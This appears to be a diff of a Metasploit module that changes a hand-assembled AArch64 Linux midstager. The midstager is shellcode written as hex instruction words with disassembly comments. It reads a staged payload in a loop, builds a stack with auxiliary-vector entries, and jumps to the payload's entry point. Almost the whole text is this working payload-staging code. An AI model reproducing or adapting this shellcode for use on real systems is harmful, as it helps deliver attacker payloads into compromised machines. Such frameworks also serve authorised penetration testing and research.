@@ -41,8 +41,7 @@ module MetasploitModule
     midstager = [
 
 
-
-            0x10000582,          #  adr	x2, b0 <size>
+            0x10000782,          #  adr	x2, f0 <size>
             0xb9400042,          #  ldr	w2, [x2]
             0xaa0203ea,          #  mov	x10, x2
             0xd34cfc42,          #  lsr	x2, x2, #12
@@ -64,36 +63,49 @@ module MetasploitModule
             0xaa0403e2,          #  mov	x2, x4
             0xd28007e8,          #  mov	x8, #0x3f                  	// #63
             0xd4000001,          #  svc	#0x0
-            0x34000260,          #  cbz	w0, a4 <failed>
+            0x34000440,          #  cbz	w0, e0 <failed>
             0x8b000063,          #  add	x3, x3, x0
             0xeb000084,          #  subs	x4, x4, x0
             0x54ffff01,          #  b.ne	44 <read_loop>
-            0x10000280,          #  adr	x0, b8 <entry>
+            0x10000480,          #  adr	x0, f8 <entry>
             0xf9400000,          #  ldr	x0, [x0]
             0x8b0a0000,          #  add	x0, x0, x10
-            0xaa0003e8,          #  mov	x8, x0
-            0xca000000,          #  eor	x0, x0, x0
-            0xca010021,          #  eor	x1, x1, x1
-            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
-            0xd2800322,          #  mov	x2, #0x19                  	// #25
-            0x910003e3,          #  mov	x3, sp
-            0xa9bf0fe2,          #  stp	x2, x3, [sp,#-16]!
-            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
-            0xd2800020,          #  mov	x0, #0x1                   	// #1
+            0xaa0003ee,          #  mov	x14, x0
+            0x910003e0,          #  mov	x0, sp
+            0x927cec1f,          #  and	sp, x0, #0xfffffffffffffff0
+            0x910183ff,          #  add	sp, sp, #0x60
+            0xd2800040,          #  mov	x0, #0x2                   	// #2
+            0xd2800da1,          #  mov	x1, #0x6d                  	// #109
+            0xf90003e1,          #  str	x1, [sp]
             0x910003e1,          #  mov	x1, sp
             0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
-            0xd61f0100,          #  br	x8
+            0xaa0c03e2,          #  mov	x2, x12
+            0xd2800003,          #  mov	x3, #0x0                   	// #0
+            0xa9bf0fe2,          #  stp	x2, x3, [sp,#-16]!
+            0xd2800004,          #  mov	x4, #0x0                   	// #0
+            0xd28000e5,          #  mov	x5, #0x7                   	// #7
+            0xa9bf17e4,          #  stp	x4, x5, [sp,#-16]!
+            0xaa0a03e6,          #  mov	x6, x10
+            0xd28000c7,          #  mov	x7, #0x6                   	// #6
+            0xa9bf1fe6,          #  stp	x6, x7, [sp,#-16]!
+            0xd2820008,          #  mov	x8, #0x1000                	// #4096
+            0xd2800329,          #  mov	x9, #0x19                  	// #25
+            0xa9bf27e8,          #  stp	x8, x9, [sp,#-16]!
+            0xaa0a03ea,          #  mov	x10, x10
+            0xd280000b,          #  mov	x11, #0x0                   	// #0
+            0xa9bf2fea,          #  stp	x10, x11, [sp,#-16]!
+            0xd280001d,          #  mov	x29, #0x0                   	// #0
+            0xd280001e,          #  mov	x30, #0x0                   	// #0
+            0xd61f01c0,          #  br	x14
             0xd2800000,          #  mov	x0, #0x0                   	// #0
             0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
             0xd4000001,          #  svc	#0x0
+            0xd503201f,          #  nop
+
             payload.length,
             0x00000000,          #  .word	0x00000000
             entry_offset,
             0x00000000,          #  .word	0x00000000
-            0x0000006d,          #  .word	0x0000006d
-            0x00000000,          #  .word	0x00000000
-            0xd503201f,          #  nop
-            0xd503201f,          #  nop
         ].pack('V*')
 
     print_status("Transmitting intermediate midstager...(#{midstager.length} bytes)")
